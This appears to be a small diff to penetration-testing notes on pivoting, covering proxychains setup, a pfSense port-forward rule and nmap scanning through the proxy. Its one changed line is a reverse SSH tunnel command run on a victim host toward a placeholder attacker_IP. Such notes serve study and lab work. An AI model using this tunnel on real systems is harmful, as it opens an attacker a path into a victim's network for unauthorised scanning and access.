@@ -18,7 +18,7 @@ Open /etc/proxychains4.conf.
 
 configure Port Fowarding rule pn pfsense
 
-(VICTIM) ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port * (this command wont show you anything go back to kali and run net stat, port shoud be open now) 
+(VICTIM) ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port  (this command wont show you anything go back to kali and run net stat, port shoud be open now) 
 (refrence wiki for screenshots)
 
 (since the proxy is now available to us we will wrap nmap inside proxychains)
